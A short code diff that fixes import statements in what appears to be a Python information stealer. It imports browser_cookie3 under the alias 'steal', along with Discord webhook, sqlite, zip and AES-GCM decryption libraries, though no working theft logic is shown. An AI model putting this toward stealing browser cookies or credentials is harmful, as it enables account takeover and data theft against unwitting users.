@@ -3,7 +3,6 @@
 import psutil
 import platform
 import json
-import getnode
 from datetime import datetime
 from time import sleep
 import requests
@@ -13,7 +12,7 @@ import os
 import re
 import requests
 import subprocess
-from uuid as get_mac
+from uuid import getnode as get_mac
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
